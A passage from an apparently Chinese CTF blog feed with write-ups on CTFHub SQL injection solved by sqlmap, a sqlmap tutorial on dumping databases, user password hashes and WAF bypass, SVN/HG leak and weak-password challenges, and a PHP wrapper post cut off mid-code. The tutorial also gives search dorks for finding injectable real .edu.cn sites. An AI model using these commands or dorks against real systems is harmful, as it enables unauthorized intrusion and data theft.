database()))))</p><p>后续步骤跟sql基本步骤一样</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241028220809635.png" alt="image-20241028220809635"></p><h4 id="SQL-布尔注入"><a href="#SQL-布尔注入" class="headerlink" title="SQL 布尔注入"></a>SQL 布尔注入</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029190728233.png" alt="image-20241029190728233"></p><blockquote><p>人工测试太麻烦，这里直接使用sqlmap,知道这有sql注入漏洞，就省去扫描步骤了。</p><p>先查看当前数据库  —sqli</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u &#x27;http://challenge-<span class="number">3</span>fe138f1ff2d9eae.sandbox.ctfhub.com:<span class="number">10800</span>/?id=<span class="number">2</span>&#x27; -batch --current-db</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029190924035.png" alt="image-20241029190924035"></p><blockquote><p>再查看表</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="punctuation">-</span>u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:<span class="number">1080</span>0/?id=2&#x27; <span class="punctuation">-</span>batch <span class="punctuation">-</span>D &#x27;sqli&#x27; <span class="punctuation">-</span><span class="punctuation">-</span>tables</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029191400321.png" alt="image-20241029191400321"></p><blockquote><p>查看flag表中的字段</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="punctuation">-</span>u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:<span class="number">1080</span>0/?id=2&#x27; <span class="punctuation">-</span>batch <span class="punctuation">-</span>D &#x27;sqli&#x27; <span class="punctuation">-</span>T &#x27;flag&#x27; <span class="punctuation">-</span><span class="punctuation">-</span>columns</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029192216810.png" alt="image-20241029192216810"></p><blockquote><p>查看flag字段下的内容，找到flag</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="punctuation">-</span>u &#x27;http://challenge-3fe138f1ff2d9eae.sandbox.ctfhub.com:<span class="number">1080</span>0/?id=2&#x27; <span class="punctuation">-</span>batch <span class="punctuation">-</span>D &#x27;sqli&#x27; <span class="punctuation">-</span>T &#x27;flag&#x27; <span class="punctuation">-</span>C &#x27;flag&#x27; <span class="punctuation">-</span><span class="punctuation">-</span>dump</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029193105341.png" alt="image-20241029193105341"></p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><blockquote><p>sqlmap步骤同上面一样</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029195709025.png" alt="image-20241029195709025"></p><h4 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h4><blockquote><p>步骤一样，只是换了个位置</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029200950786.png" alt="image-20241029200950786"></p><h4 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h4><blockquote><p>就是在cookie处进行sql注入，一般cookie处会有暗示</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029201349676.png" alt="image-20241029201349676"></p><blockquote><p>将抓包信息保存在txt文件中，然后在cookie处的id=1处加个*号，即改成</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">id</span><span class="operator">=</span><span class="number">1</span>*</span><br></pre></td></tr></table></figure><p>指定cookie查询</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="attribute">r</span> temp<span class="selector-class">.txt</span> -batch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029201838886.png" alt="image-20241029201838886"></p><blockquote><p>发现存在cookie注入，然后就是与上述步骤相似</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -<span class="attribute">r</span> temp<span class="selector-class">.txt</span> -batch <span class="attr">--dbs</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029202129708.png" alt="image-20241029202129708"></p><h4 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h4><blockquote><p>refer注入的特征就是抓包后发现缺少refer头部，然后在refer处进行sql漏洞注入。</p></blockquote><p><strong>注意：直接扫描漏洞需要level 3及以上才会查询文件头(UA,refer等)</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u <span class="string">&#x27;http://xxx.com&#x27;</span> -level <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这道题：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sqlmap</span> -u &#x27;http://challenge-<span class="number">3</span>cf6a5a75d4ca322.sandbox.ctfhub.com:<span class="number">10800</span>/&#x27; -level <span class="number">3</span> -batch</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029203326528.png" alt="image-20241029203326528"></p><blockquote><p>发现ua注入，剩下的步骤同上</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">sqlmap <span class="punctuation">-</span>u &#x27;http://challenge-3cf6a5a75d4ca322.sandbox.ctfhub.com:<span class="number">1080</span>0/&#x27; <span class="punctuation">-</span>level <span class="number">3</span> <span class="punctuation">-</span>batch <span class="punctuation">-</span>D &#x27;sqli&#x27; <span class="punctuation">-</span>T &#x27;vjzangmqpt&#x27; <span class="punctuation">-</span><span class="punctuation">-</span>dump </span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029203510461.png" alt="image-20241029203510461"></p><h4 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h4><blockquote><p>步骤同上</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029205211346.png" alt="image-20241029205211346"></p><p><strong>强调：如果直接检查时间太长，可以抓包放进txt文件，在对应的地方注入然后打个标记，然后用文件扫描。</strong></p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><blockquote><p>使用tamper模块space2comment.py，步骤一样</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://challenge-922c2f9d7e288e20.sandbox.ctfhub.com:10800?id=1&#x27;</span> <span class="attr">--tamper</span> space2comment<span class="selector-class">.py</span> -batch <span class="attr">--dbs</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241029215956237.png" alt="image-20241029215956237"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用方法</title>
      <link href="/posts/11f9f536.html"/>
      <url>/posts/11f9f536.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/80d2a4ffaa0cb7d7d1db82770ccdf1cf.png" alt="img"></p><p>SQLmap<br>一、目标<br>1、指定url<br>2、指定文件（批量检测）<br>3、指定数据库/表/字段<br>4、post请求<br>5、cookie注入<br>二、脱库<br>1、获取数据库<br>2、获取表<br>3、获取字段<br>4、获取字段类型<br>5、获取值（数据）<br>6、获取用户<br>7、获取主机名<br>8、搜索库、表、字段。<br>9、正在执行的SQL语句<br>三、WAF绕过<br>三、其他<br>SQLmap是一款「自动化」SQL注入工具，kali自带。路径 /usr/share/sqlmap</p><p>打开终端，输入sqlmap，出现以下界面，就说明SQLmap「可用」。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3323630f970599810ae0f763b683dfe5.png" alt="在这里插入图片描述"></p><p>本篇文章使用本地搭建的SQL-labs靶场作为「演示」目标，其他目标可使用必应搜索以下类型的网站：</p><p>inurl:news.asp?id=site:edu.cn<br>inurl:news.php?id= site:edu.cn<br>inurl:news.aspx?id=site:edu.cn<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f8c3e9690521f33f60d6a89532b65714.png" alt="在这里插入图片描述"></p><p>快速入门；SQLmap（常规）使用步骤</p><p>1、检测「注入点」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘</p><p>2、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —dbs</p><p>3、查看当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —current-db</p><p>4、查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —tables</p><p>5、查看「字段」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —tables</p><p>6、查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —dump</p><p>一、目标<br>检测「注入点」前，需要指定需要检测的「对象」。</p><p>1、指定url<br>-u 参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。</p><p>提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>‘</p><p>扫描完成后，告诉我们存在的注入类型和使用的数据库及版本。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/99db1296c6f1ba11ece43312a58b9a74.png" alt="在这里插入图片描述"></p><p>2、指定文件（批量检测）<br>准备一个「文件」，写上需要检测的多个url，一行一个。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/8cf3f6fe34fdf02ee2474dffd150824a.png" alt="在这里插入图片描述"></p><p>-m 指定文件，可以「批量扫描」文件中的url。</p><p>sqlmap -m urls.txt<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/fdcee37c60c4d1a23dbce8cafdbe8968.png" alt="在这里插入图片描述"></p><p>逐个扫描url，需要确认就按y。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f28535eaea3312dc0f7efc5c9789109a.png" alt="在这里插入图片描述"></p><p>扫描完一个，就会提示存在的注入点。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1e67c982280d436862f49d38a8d33278.png" alt="在这里插入图片描述"></p><p>然后再按y扫描下一个url。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5bd840d90d0fded18745dd251fc46926.png" alt="在这里插入图片描述"></p><p>3、指定数据库/表/字段<br>-D 指定目标「数据库」，单/双引号包裹，常配合其他参数使用。</p><p>-T 指定目标「表」，单/双引号包裹，常配合其他参数使用。</p><p>-C 指定目标「字段」，单/双引号包裹，常配合其他参数使用。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ -C ‘username’ —dump</p><p>4、post请求<br>检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。</p><p>-r 指定需要检测的文件，SQLmap会通过post请求方式检测目标。</p><p>sqlmap -r bp.txt</p><p>5、cookie注入<br>—cookie 指定cookie的值，单/双引号包裹。</p><p>sqlmap -u “<a href="http://xx?id=x">http://xx?id=x</a>“ —cookie ‘cookie’</p><p>二、脱库<br>获取所有内容</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -a</p><p>-a 就是 all 的意思，获取所有能获取的内容，会消耗很长时间。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/19f8f30a893f664e9ff2cb7ed78c978e.png" alt="在这里插入图片描述"></p><p>1、获取数据库<br>—dbs 获取数据库</p><p>1.1、获取数据库版本</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -b<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/89f970b1e9f84a016b2f69c4b5a057cf.png" alt="在这里插入图片描述"></p><p>最后面显示数据库的版本，这里检测的版本是 5.7.26。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/54199c4a0bf8977e927a146a8a7ab4d7.png" alt="在这里插入图片描述"></p><p>1.2、获取当前使用的数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —current-db<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/743ee0d21d6da89ca35e65e420862827.png" alt="在这里插入图片描述"></p><p>在最后面显示当前使用的数据库的名字是 security。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3363af3cd6ad4b6cd3dfc43b86b08edb.png" alt="在这里插入图片描述"></p><p>1.3、获取所有数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —dbs<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/3a12f1219213ff35ff08b280c9c891f1.png" alt="在这里插入图片描述"></p><p>最后面显示所有数据库的名字。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c3ec183bd1f5e0d5dcba921e5730c0a5.png" alt="在这里插入图片描述"></p><p>2、获取表<br>—tables 获取表</p><p>2.1、获取表，可以指定数据库</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/166b14fd037781f3ed47475c67d63e51.png" alt="在这里插入图片描述"></p><p>最后面显示数据库（security）里所有的表名。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b4da6acd6de9525699a41b9d7c7b6529.png" alt="在这里插入图片描述"></p><p>2.2、同时获取多个库的表名，库名用逗号分隔。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security,sys’ —tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d3e39fbc0417cc7070d7758475e8ecbe.png" alt="在这里插入图片描述"></p><p>2.3、不指定数据库，默认获取数据库中所有的表。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —tables<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/41753aed6ee25a50025b643d165fd311.png" alt="在这里插入图片描述"></p><p>最后面显示每个数据库下都有哪些表。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c9b8732f73e248eb0b9cb9c863c71722.png" alt="在这里插入图片描述"></p><p>3、获取字段<br>—columns 参数用来获取字段。</p><p>3.1、获取字段，可以指定库和表</p><p>提示：只指定库名但不指定表名会报错。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —columns<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/47c49038c40755474475ba8ddf6d9aef.png" alt="在这里插入图片描述"></p><p>最后面显示表（users）中的所有字段。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2ab76f10298b7b9b59c06379adb67f8a.png" alt="在这里插入图片描述"></p><p>3.2、不指定表名，默认获取当前数据库中所有表的字段。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —columns<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/684209317b809b4a82b77b7872a7034c.png" alt="在这里插入图片描述"></p><p>4、获取字段类型<br>—schema 获取字段类型，可以指定库或指定表。不指定则获取数据库中所有字段的类型。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —schema</p><p>最后面显示每个表的字段类型。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b1965bfe6007dc83c0440bef8cd8ae10.png" alt=""></p><p>5、获取值（数据）<br>—dump 获取值，也就是表中的数据。可以指定具体的库、表、字段。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ -C ‘username,password’ —dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ecd1d24e4e0bdbdb1ba798726e6e77cf.png" alt="在这里插入图片描述"></p><p>获取指定库中所有表的数据。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d480d1cd9e20ab969260167879358341.png" alt="在这里插入图片描述"></p><p>默认获取表中的所有数据，可以使用 —start —stop 指定开始和结束的行，只获取一部分数据。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ -T ‘users’ —start 1 —stop 5  —dump<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/e45e5376ea29c75c80d3e87297370046.png" alt="在这里插入图片描述"></p><p>6、获取用户<br>6.1、获取当前登录数据库的用户</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>‘ —current-user<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/0f0ae3b919b625e53dfe30aa705fb322.png" alt="在这里插入图片描述"></p><p>最后面显示当前登录数据库的用户是 root@localhost。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/dce01c43d07d1b778b6336b24ab774ed.png" alt="在这里插入图片描述"></p><p>6.2、获取所有用户</p><p>—users 获取数据库的所有用户名。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —users<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9d541ae654c75a6b45bdca4956c69e70.png" alt="在这里插入图片描述"></p><p>最后面显示数据库的所有用户名。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/f1eb8ad5e8f00a10b3ea7a303559cc7f.png" alt="在这里插入图片描述"></p><p>6.3、获取用户密码</p><p>—passwords 获取所有数据库用户的密码（哈希值）。</p><p>数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然，你也可以借助工具把它们解析成明文。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ebad8785668740e1c0007c260b93fac2.png" alt="在这里插入图片描述"></p><p>最后面显示数据库用户名对应的密码（哈希值）。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/83d4aba88e0edcb7ac8dfd27a14fc126.png" alt="在这里插入图片描述"></p><p>6.4、获取用户权限</p><p>—privileges 查看每个数据库用户都有哪些权限。</p><p>sqlmap -u ‘<a href="http://192.168.31.180/sqli-labs-master/Less-1/?id=1">http://192.168.31.180/sqli-labs-master/Less-1/?id=1</a>‘ —privileges<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/7f0d13d348c5808f35bce7ac3fb8c789.png" alt="在这里插入图片描述"></p><p>最后面显示每个数据库用户所拥有的权限。这里root的权限最多，很明显它就是数据库的管理员账号。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9e82023aba3b2ba54cf68e08170df323.png" alt="在这里插入图片描述"></p><p>6.5、判断当前用户是不是管理员</p><p>—is-dba 判断当前登录的用户是不是数据库的管理员账号。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —is-dba<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/49cc910b7a95c7bf683f755fd29d4643.png" alt="在这里插入图片描述"></p><p>如果是管理员，就在最后面显示 true。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/30bf8aefb915a4a5e04756fe0eb14a48.png" alt="在这里插入图片描述"></p><p>7、获取主机名<br>—hostname 获取服务器主机名。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —hostname<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1db165db1e031427e4f28167ad1d0f8d.png" alt="在这里插入图片描述"></p><p>最后面显示服务器的主机名是 DESKTOP。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/d5af455c6d16ff03f3b8cd6abbf5e92a.png" alt="在这里插入图片描述"></p><p>8、搜索库、表、字段。<br>—search 搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。</p><p>搜索数据库中有没有 security 这个数据库：</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D ‘security’ —search<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c0352f71a931992007a5131210176ce2.png" alt="在这里插入图片描述"></p><p>需要手动选择模糊匹配（1）还是完全匹配（2），而后返回匹配的结果。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b3ff66fa096a1dd0ea3ac3fb8d8ff188.png" alt="在这里插入图片描述"></p><p>也可以搜索表</p><p>sqlmap -u ‘<a href="http://xxx/?id=1">http://xxx/?id=1</a>‘ -T ‘users’ —search</p><p>或者搜索字段</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -C ‘username’ —search</p><p>9、正在执行的SQL语句<br>—statements 获取数据库中正在执行的SQL语句。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —statements<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/cad70c65b23e12ad93624f81019c8cfa.png" alt="在这里插入图片描述"></p><p>最后面显示正在执行的SQL语句。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/9e14994f2b5460205c132ff90d3e79e6.png" alt="在这里插入图片描述"></p><p>三、WAF绕过<br>—tamper 指定绕过脚本，绕过WAF或ids等。</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ —tamper ‘space2comment.py’<br><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/b03fed1f5f8b5b7a804af437393e61a4.png" alt="在这里插入图片描述"></p><p>SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/c547aee553de76dc5d54f8658d10d7d2.png" alt="在这里插入图片描述"></p><p>脚本按照用途命名，比如 space2comment.py 是指，用/**/代替空格。</p><p>当然，你也可以根据内置脚本格式，自己定义绕过脚本。</p><p>三、其他<br>—batch （默认确认）不再询问是否确认。</p><p>—method=GET 指定请求方式（GET/POST）</p><p>—random-agent 随机切换UA（User-Agent）</p><p>—user-agent ‘ ‘ 使用自定义的UA（User-Agent）</p><p>—referer ‘ ‘ 使用自定义的 referer</p><p>—proxy=”127.0.0.1:8080” 指定代理</p><p>—threads 10 设置线程数，最高10</p><p>—level=1 执行测试的等级（1-5，默认为1，常用3）</p><p>—risk=1 风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险。</p><p>sqlmap绕过脚本模块使用：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&#x27;http://xxx.com&#x27;</span> <span class="attr">--tamper</span> <span class="selector-attr">[模块名]</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题2024.10.26</title>
      <link href="/posts/790be4e8.html"/>
      <url>/posts/790be4e8.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><blockquote><p>来源：CTFHUB</p></blockquote><h4 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026143331724.png" alt="image-20241026143331724"></p><blockquote><p>扫描一下目录，发现有/svn，所以是svn泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152141560.png" alt="image-20241026152141560"></p><blockquote><p>使用工具dvcs-ripper将泄露的文件下载到本地目录中</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152300541.png" alt="image-20241026152300541"></p><blockquote><p>先用 ls -al 查看，再转到.svn文件夹中查看下载的文件。</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026152505737.png" alt="image-20241026152505737"></p><blockquote><p>根据题目可知，在旧版服务器，所以访问pristime文件夹，在其中找到了flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026153044983.png" alt="image-20241026153044983"></p><blockquote><p>ctfhub{4e0bf99268e971a228b50696}</p></blockquote><h4 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026153720698.png" alt="image-20241026153720698"></p><blockquote><p>先扫描目录，发现.hg文件，所以是hg文件泄露</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026154228171.png" alt="image-20241026154228171"></p><blockquote><p>将文件下载到本地</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155713885.png" alt="image-20241026155713885"></p><blockquote><p>查看内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155739491.png" alt="image-20241026155739491"></p><blockquote><p>打开看到的.txt文件，发现添加了flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026155829484.png" alt="image-20241026155829484"></p><blockquote><p>使用正则表达式匹配flag</p><p>grep -a -r flag</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026160139201.png" alt="image-20241026160139201"></p><blockquote><p>发现一个.txt文件名路径，打开发现flag</p><p><a href="http://challenge-f5d5a98ec092b9ff.sandbox.ctfhub.com:10800/flag_2461926440.txt">http://challenge-f5d5a98ec092b9ff.sandbox.ctfhub.com:10800/flag_2461926440.txt</a></p><p>ctfhub{28354671de5448e69f93511c}</p></blockquote><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171134560.png" alt="image-20241026171134560"></p><blockquote><p>进行爆破，选择集束炸弹</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171232301.png" alt="image-20241026171232301"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171247068.png" alt="image-20241026171247068"></p><blockquote><p>ctfhub{922a54553d59ecd22800296d} </p></blockquote><h4 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171937965.png" alt="image-20241026171937965"></p><blockquote><p>网络搜索eyou网关默认账号密码，挨着试</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026172024713.png" alt="image-20241026172024713"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241026171914804.png" alt="image-20241026171914804"></p><blockquote><p>ctfhub{780ed41da21c1e4a55d3962b}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/posts/5a47ecbe.html"/>
      <url>/posts/5a47ecbe.html</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h1><p>php://伪协议是php提供的一些输入输出流访问功能，允许访问php的输入输出流，标准输入输出和错误描述符，内存中，磁盘备份的临时文件流，以及可以操作其他读取和写入文件的过滤器。</p><p>首先看到题目提示传个file，遂/?file=…一个随意参数，而后得到源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;allow_url_include&quot;</span>,<span class="string">&quot;on&quot;</span>);</span><br><span class="line"><span class="title 